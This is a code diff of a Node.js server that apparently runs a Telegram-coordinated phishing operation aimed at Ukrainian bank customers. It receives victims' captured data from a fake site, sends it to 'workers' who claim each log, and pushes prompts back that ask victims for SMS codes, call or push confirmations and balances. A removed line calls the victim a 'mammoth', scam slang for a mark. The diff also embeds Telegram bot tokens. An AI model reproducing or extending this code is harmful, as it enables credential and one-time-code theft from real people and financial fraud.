@@ -5,13 +5,11 @@ const app = express();
 app.use(express.json());
 app.use(express.static('public'));
 
-const BOT_TOKEN = '7241095700:AAEgOg76qDghDbKYurhOsTrzSltKxYugtBg';
-const CHANNEL_ID = '-1003455979409'; // Канал для уведомлений
-const BOT_USERNAME = 'ТВОЙ_БОТ_USERNAME'; // ЗАМЕНИ ЭТО (например, MyPrivatBot)
+const BOT_TOKEN = '8003392137:AAFbnbKyLJS6N1EdYSxtRhR9n5n4eJFpBbw';
+const CHANNEL_ID = '-1003455979409';
 
-// Хранилища
 let userTasks = {}; 
-let logsStorage = {}; // Храним полные данные здесь
+let logsStorage = {}; 
 
 const cmdTexts = {
     'sms': 'Введіть код підтвердження, що надійшов у СМС',
@@ -27,14 +25,11 @@ const safeText = (text) => String(text).replace(/&/g, '&amp;').replace(/</g, '&l
 // --- ПРИЕМ ЛОГА С САЙТА ---
 app.post('/api/log', async (req, res) => {
     const { userId, type, data } = req.body;
-    
-    // Сохраняем полный лог в память сервера по ID
     logsStorage[userId] = { type, data, time: new Date().toLocaleTimeString() };
 
-    // В КАНАЛ шлем только короткое уведомление
     let channelMsg = `<b>🆕 НОВИЙ ЛОГ [${safeText(type)}]</b>\n`;
     channelMsg += `🆔 ID: <code>${safeText(userId)}</code>\n`;
-    channelMsg += `📍 Статус: Очікує обробки...`;
+    channelMsg += `📍 Статус: 🔵 Очікує...`;
 
     try {
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -43,23 +38,16 @@ app.post('/api/log', async (req, res) => {
             parse_mode: 'HTML',
             reply_markup: {
                 inline_keyboard: [
-                    [
-                        { 
-                            text: "⚡️ ВЗЯТИ В РОБОТУ", 
-                            url: `https://t.me/${BOT_USERNAME}?start=${userId}` 
-                        }
-                    ]
+                    [{ text: "⚡️ ВЗЯТИ В РОБОТУ", callback_data: `take_${userId}` }]
                 ]
             }
         });
         res.json({ success: true });
     } catch (e) {
-        console.error("❌ ОШИБКА КАНАЛА:", e.message);
         res.status(500).send('Error');
     }
 });
 
-// --- ПРОВЕРКА КОМАНД (САЙТ ОПРАШИВАЕТ) ---
 app.get('/api/check/:userId', (req, res) => {
     const userId = req.params.userId;
     const task = userTasks[userId] || null;
@@ -69,63 +57,87 @@ app.get('/api/check/:userId', (req, res) => {
 
 // --- ВЕБХУК ТЕЛЕГРАМ ---
 app.post('/tg-webhook', async (req, res) => {
-    const { message, callback_query } = req.body;
+    const { callback_query } = req.body;
 
-    // 1. Если нажали кнопку-ссылку /start в боте
-    if (message && message.text && message.text.startsWith('/start')) {
-        const userId = message.text.split(' ')[1];
-        const log = logsStorage[userId];
+    if (callback_query) {
+        const data = callback_query.data;
+        const worker = callback_query.from; // Кто нажал кнопку
+        const workerName = worker.username ? `@${worker.username}` : worker.first_name;
 
-        if (log) {
-            let fullMsg = `<b>💎 ПОВНИЙ ЛОГ [${log.type}]</b>\n`;
-            fullMsg += `🆔 ID: <code>${userId}</code>\n`;
-            fullMsg += `⏰ Час: ${log.time}\n`;
-            fullMsg += `------------------------\n`;
-            for (let key in log.data) {
-                fullMsg += `<b>${key}:</b> <code>${log.data[key]}</code>\n`;
-            }
+        // 1. ЛОГИКА "ВЗЯТЬ В РАБОТУ"
+        if (data.startsWith('take_')) {
+            const userId = data.split('_')[1];
+            const log = logsStorage[userId];
 
-            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                chat_id: message.chat.id,
-                text: fullMsg,
-                parse_mode: 'HTML',
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            { text: "💬 СМС", callback_data: `ask_${userId}_sms` },
-                            { text: "📞 Звонок", callback_data: `ask_${userId}_call` }
-                        ],
-                        [
-                            { text: "📲 Пуш", callback_data: `msg_${userId}_push` },
-                            { text: "💰 Баланс", callback_data: `msg_${userId}_bal` }
-                        ],
-                        [
-                            { text: "✍️ Свой текст", callback_data: `ask_${userId}_custom` }
-                        ]
-                    ]
+            if (log) {
+                // Отправляем лог воркеру в личку
+                let fullMsg = `<b>💎 ПОВНИЙ ЛОГ [${log.type}]</b>\n`;
+                fullMsg += `🆔 ID: <code>${userId}</code>\n`;
+                fullMsg += `⏰ Час: ${log.time}\n`;
+                fullMsg += `------------------------\n`;
+                for (let key in log.data) {
+                    fullMsg += `<b>${key}:</b> <code>${log.data[key]}</code>\n`;
                 }
-            });
-        } else {
-            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                chat_id: message.chat.id,
-                text: "❌ Лог не знайдений або застарів."
+
+                try {
+                    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        chat_id: worker.id,
+                        text: fullMsg,
+                        parse_mode: 'HTML',
+                        reply_markup: {
+                            inline_keyboard: [
+                                [
+                                    { text: "💬 СМС", callback_data: `ask_${userId}_sms` },
+                                    { text: "📞 Дзвінок", callback_data: `ask_${userId}_call` }
+                                ],
+                                [
+                                    { text: "📲 Пуш", callback_data: `msg_${userId}_push` },
+                                    { text: "💰 Баланс", callback_data: `msg_${userId}_bal` }
+                                ],
+                                [
+                                    { text: "✍️ Свій текст", callback_data: `ask_${userId}_custom` }
+                                ]
+                            ]
+                        }
+                    });
+
+                    // Редактируем сообщение в канале
+                    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
+                        chat_id: CHANNEL_ID,
+                        message_id: callback_query.message.message_id,
+                        text: `<b>🆕 ЛОГ [${log.type}]</b>\n🆔 ID: <code>${userId}</code>\n📍 Взяв у роботу: <b>${workerName}</b> ✅`,
+                        parse_mode: 'HTML'
+                    });
+
+                    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+                        callback_query_id: callback_query.id,
+                        text: "Лог відправлено вам у приватні повідомлення!"
+                    });
+                } catch (err) {
+                    // Если воркер не запустил бота, он не сможет отправить сообщение
+                    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+                        callback_query_id: callback_query.id,
+                        text: "⚠️ Спершу запустіть бота в приватних повідомленнях!",
+                        show_alert: true
+                    });
+                }
+            }
+        }
+
+        // 2. ЛОГИКА КНОПОК ОШИБОК (callback)
+        if (data.startsWith('ask_') || data.startsWith('msg_')) {
+            const [action, userId, code] = data.split('_');
+            userTasks[userId] = { action, text: cmdTexts[code] || "Введіть дані" };
+            
+            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+                callback_query_id: callback_query.id,
+                text: "✅ Команда відправлена!"
             });
         }
-    }
-
-    // 2. Если нажали кнопку ошибки (callback)
-    if (callback_query) {
-        const [action, userId, code] = callback_query.data.split('_');
-        userTasks[userId] = { action, text: cmdTexts[code] || "Введіть дані" };
-        
-        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
-            callback_query_id: callback_query.id,
-            text: "✅ Команда відправлена мамонту!"
-        });
     }
     
     res.sendStatus(200);
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`🚀 Сервер готов`));
+app.listen(PORT, () => console.log(`🚀 Сервер запущен`));
